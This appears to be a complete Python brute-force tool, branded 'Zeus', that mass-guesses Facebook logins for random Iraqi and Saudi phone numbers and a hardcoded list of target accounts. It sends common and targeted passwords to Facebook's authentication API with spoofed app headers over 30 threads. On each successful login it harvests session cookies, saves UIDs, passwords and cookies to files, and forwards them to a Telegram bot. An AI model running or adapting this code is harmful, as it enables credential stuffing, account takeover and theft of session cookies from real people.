#==[MODULE]==#
from requests import get,post
from random import choice,randrange
from threading import Thread
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import os
import requests
import random
import uuid
import datetime
from uuid import uuid4
import random , webbrowser
import requests,time,os,random,string;
import os, sys, requests, random, json, time, uuid

from concurrent.futures import ThreadPoolExecutor as r
from datetime import datetime
from requests import get,post
from random import choice,randrange
from threading import Thread
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import os
import requests
import random
import uuid
import datetime
from uuid import uuid4
import random , webbrowser
import requests,time,os,random,string;

#==[COLORS]==#
a1 = '\x1b[1;31m'
a2 = '\x1b[1;34m'
a3 = '\x1b[1;32m'
a4 = '\x1b[1;33m'
a5 = '\x1b[38;5;208m'
a6 = '\x1b[38;5;5m'
a7 = '\x1b[38;5;13m'
a8 = '\x1b[1;30m'
a9 = '\x1b[1;37m'
a30 = '\x1b[38;5;255m'
gg = '\x1b[38;5;208m'
X = '\033[1;33m'
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
F='\x1b[2;32m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'
G = '\033[1;34m'
M = '\x1b[1;37m'
B='\x1b[1;37m'
turquoise  = "\033[1;38;5;80m"
R = '\033[1;31m'
G = '\033[1;32m'
B = '\x1b[38;5;208m'

#==[TARGET ACCOUNTS]==#
TARGET_ACCOUNTS = [
    "100012724893433",
    "07704863451",
    "100025756063436",
    "6655344",
    "100006808148292",
    "07706268448",
    "07703830692",
    "100084209575356",
    "100085181272974",
    "07708844087",
    "3277801",
    "100031144871170",
    "١٣٣٤٥٦",
    "61585244912117",
    "07700065344",
    "100006350705476",
    "hama1234",
    "100051145420366",
    "07705263523",
    "100016229652117",
    "07706244481",
    "61581249820508",
    "07708637299",
    "100049465967045",
    "07700770",
    "100006571146893",
    "07709386795",
    "100006486118885",
]

#==[TARGET PASSWORDS]==#
TARGET_PASSWORDS = [
    "6655344",
    "07706268448",
    "100084209575356",
    "100031144871170",
    "61585244912117",
    "100006350705476",
    "hama1234",
    "100051145420366",
    "100016229652117",
    "61581249820508",
    "100049465967045",
    "100006571146893",
    "100006486118885",
]

#==[GLOBAL]==#
id, ok, cp, loop = [], 0, 0, 0
user_tok = ""
user_id = ""

headers = {
  'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001) [FBAN/ViewpointsForAndroid;FBAV/286.0.0.1.109;FBBV/768956344;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/realme;FBBD/realme;FBDV/RMX3081;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2242};FB_FW/1;]",
  'Accept-Encoding': "gzip",
  'content-type': "application/json;charset=utf-8"
}

Logo = f"""
{P}●─────━Zeus─────━●
{R}╱╱╭━━━┳━┳━━━┳━╮
{P}╭━┫╭━╮┃━┫╭━╮┃━┫
{R}┃╋┣╯╭╯┣━┣╯╭╯┣━┃
{P}┃╭╯╱┃╭┻━╯╱┃╭┻━╯
{R}╰╯╱╱┃┃╱╱╱╱┃┃
{P}●─────━Zeus─────━●

{gg}PY~@R7_36 ~R7Aih1
"""

#==[TELEGRAM SEND]==#
def tg_send(msg, tok, cid):
    try:
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", 
                     data={"chat_id": cid, "text": msg}, timeout=10)
    except:
        pass

#==[PAYLOAD]==#
def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",}
    return payload

#==[CRACK]==#
def crackfree(ids, pwxs):
    global ok, cp, loop
    ne = random.choice(["\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m"])    
    sys.stdout.write(f'\r\r\r\033[1;37m\033[1m[{M}{ne}Zeus{M}]{a9} [OK:-\033[0;32m\033[1m{ok}\033[1;37m\033[1m] [CP:-{Z}{cp}\033[1;37m\033[1m] [{turquoise}{loop}\x1b[38;5;255m] ')
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            data = pm(ids, pw)
            req = requests.post(
                'https://b-graph.facebook.com/auth/login',
                headers=headers,
                data=data,
                timeout=10
            ).json()
            
            # ✅ حساب شغال
            if 'session_key' in req:
                uid = req["uid"]
                coki = ';'.join(i['name']+'='+i['value'] for i in req['session_cookies'])
                ok += 1
                
                print(f"\r\r\033[0;32m\033[1m[@R7_36-OK] {uid} | {pw}")
                
                user_msg = f"""
       حساب شغال (OK)


 الرقم     : {uid}
 الباسورد  : {pw}
 الكوكيز   : {coki}
 الرابط    : https://www.facebook.com/profile.php?id={uid}

━━━━━━━━━━━━━━━━━━━━━
 Dev     : @R7_36
 Channel : @R7Aih1
"""
                tg_send(user_msg, user_tok, user_id)
                
                try:
                    with open('zeus_ok.txt', 'a', encoding='utf-8') as f:
                        f.write(f"UID: {uid} | PASS: {pw} | COOKIES: {coki}\n")
                except: pass
                break
            
            # ⚠️ حساب سيكور
            elif 'www.facebook.com' in req.get("error",{}).get("message",""):
                uid = req["error"]["error_data"]["uid"]
                cp += 1
                
                print(f"\r\r\x1b[38;5;208m\033[1m[@R7_36-CP]\033[0;32m\033[1m {uid} | {pw}")
                
                user_msg = f"""
      حساب سكيور (CP)


 UID      : {uid}
 الباسورد : {pw}
 الرابط   : https://www.facebook.com/profile.php?id={uid}

━━━━━━━━━━━━━━━━━━━━━
 Dev     : @R7_36
 Channel : @R7Aih1
"""
                tg_send(user_msg, user_tok, user_id)
                
                try:
                    with open('zeus_cp.txt', 'a', encoding='utf-8') as f:
                        f.write(f"UID: {uid} | PASS: {pw}\n")
                except: pass
                break
            else:
                pass
                
        except requests.exceptions.ConnectionError:
            time.sleep(1)
            pass
        except Exception:
            pass
    
    loop += 1

#==[MENU]==#
def menu():
    global user_tok, user_id
    
    os.system('clear')
    print(Logo)
    user_id = input(f'\x1b[1;32m[?] ID    : \033[1;31m')
    user_tok = input(f'\x1b[1;32m[?] Token : \033[1;31m')
    
    os.system('clear')
    print(Logo)
    print(f'\x1b[1;31m[√] Code Iraq   (0750,0751,0770,0780,0781)....')
    print(f'\x1b[1;31m[√] Code Saudi  (050,053,054,055,056,057,058)....')
    print(G+'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')   
    sim = input(f'\033[1;37m\033[1m[?] Choose Country Code : ')
    print(G+'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
    
    # 🎯 توليد أرقام عشوائية
    for _ in range(44444):  
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        id.append(nmp)
    
    # 🎯 إضافة الأرقام الهدف (بدون طباعة)
    for t in TARGET_ACCOUNTS:
        id.append(t)
    
    # 🚫 مسح الشاشة — ما يظهر أي كتابة إضافية
    os.system('clear')
    
    with r(max_workers=30) as am:
        for idx in id:
            # إذا الرقم من القائمة الهدف — استخدمه كما هو
            if str(idx) in TARGET_ACCOUNTS:
                ids = str(idx)
            else:
                ids = sim + str(idx)
            
            pwxs = [
                ids,
                str(idx),
                # 🎯 الباسوردات الهدف
                *TARGET_PASSWORDS,
                # باسوردات إضافية
                'zxcv12345','123456789cd','123456a','qwerty123','login',
                'iloveyou','passw0rd','football','123456789','12345',
                '987654321','donald','qwertyuiop','1234567890','tigger',
                'andrew','696969','1234qwer','123abc123','123456b',
                '123456f','123456j','zxcvbn','1qaz2wsx3edc','password1234',
                '123456789wx','test123456','admin12345','password123456',
                '123asd123','qwe123qwe','qwerty123456','123456789d','12345678a',
                '123456789yz','password222','password333','password999',
                'asdf123456','123456789mn','123456789ef','zxcv123456',
            ]
            am.submit(crackfree, ids, pwxs)
    
    exit()

menu()